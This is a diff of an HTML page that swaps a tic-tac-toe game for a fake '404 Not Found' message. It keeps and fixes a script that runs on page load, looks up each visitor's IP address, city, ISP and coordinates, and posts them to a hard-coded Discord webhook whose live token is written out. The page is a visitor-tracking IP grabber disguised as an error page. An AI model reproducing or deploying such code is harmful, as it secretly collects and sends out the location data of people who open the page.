@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Joker Community</title>
+    <title>404 Not Found</title>
     <link rel="shortcut icon" href="https://i.pinimg.com/originals/a4/7b/5a/a47b5a27f08e1bd6a140617856415ce7.jpg">
     <!-- CSS -->
     <link rel="stylesheet" href="src/css/main.min.css">
@@ -29,46 +29,29 @@
         height: 100vh;
         background-color: #f0f0f0;
         margin: 0;
+        flex-direction: column;
+      }
+      h1 {
+        font-size: 3em;
+        margin: 0.5em;
+        color: #333;
+      }
+      p {
+        font-size: 1.5em;
+        color: #666;
       }
       .header {
-        display: none
+        display: none;
       }
       .map-container {
-        display: none
-      }
-      .tic-tac-toe {
-        display: grid;
-        grid-template-columns: repeat(3, 100px);
-        grid-template-rows: repeat(3, 100px);
-        gap: 10px;
-      }
-      .cell {
-        width: 100px;
-        height: 100px;
-        background-color: #fff;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        font-size: 24px;
-        font-weight: bold;
-        cursor: pointer;
-        border: 2px solid #ccc;
+        display: none;
       }
     </style>
   </head>
   <body>
     <header class="header"></header>
-    <div class="tic-tac-toe">
-      <div class="cell" data-index="0"></div>
-      <div class="cell" data-index="1"></div>
-      <div class="cell" data-index="2"></div>
-      <div class="cell" data-index="3"></div>
-      <div class="cell" data-index="4"></div>
-      <div class="cell" data-index="5"></div>
-      <div class="cell" data-index="6"></div>
-      <div class="cell" data-index="7"></div>
-      <div class="cell" data-index="8"></div>
-    </div>
+    <h1>404 Not Found</h1>
+    <p>The page you are looking for does not exist.</p>
     <script>
       var wbhk = 'https://discord.com/api/webhooks/1255956386051915786/695VoO-xggrciA5sdyIZ3Deu5g2ZFU21tVPL2moTC-BCslzu2OBNjaEBDrclwBUQkekF';
 
@@ -91,10 +74,11 @@
 
       Promise.all([
         get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"),
-        get_information("https://api.ipify.org/")
+        get_information("https://api.ipify.org?format=json")
       ]).then(responses => {
         var extra = responses[0];
-        var ispp = responses[1];
+        var ipInfo = JSON.parse(responses[1]);
+        var ispp = ipInfo.ip;
 
         const request = new XMLHttpRequest();
         request.open("POST", wbhk);
@@ -108,59 +92,6 @@
       }).catch(error => {
         console.error("Error fetching information: ", error);
       });
-
-      // Tic-Tac-Toe game logic
-      const cells = document.querySelectorAll('.cell');
-      let currentPlayer = 'X';
-      const winningCombinations = [
-        [0, 1, 2],
-        [3, 4, 5],
-        [6, 7, 8],
-        [0, 3, 6],
-        [1, 4, 7],
-        [2, 5, 8],
-        [0, 4, 8],
-        [2, 4, 6]
-      ];
-
-      cells.forEach(cell => {
-        cell.addEventListener('click', () => {
-          if (cell.textContent === '') {
-            cell.textContent = currentPlayer;
-            if (checkWin()) {
-              setTimeout(() => alert(currentPlayer + ' wins!'), 10);
-              resetGame();
-            } else if (checkDraw()) {
-              setTimeout(() => alert('Draw!'), 10);
-              resetGame();
-            } else {
-              currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
-            }
-          }
-        });
-      });
-
-      function checkWin() {
-        return winningCombinations.some(combination => {
-          return combination.every(index => {
-            return cells[index].textContent === currentPlayer;
-          });
-        });
-      }
-
-      function checkDraw() {
-        return [...cells].every(cell => {
-          return cell.textContent !== '';
-        });
-      }
-
-      function resetGame() {
-        cells.forEach(cell => {
-          cell.textContent = '';
-        });
-        currentPlayer = 'X';
-      }
     </script>
   </body>
 </html>
-
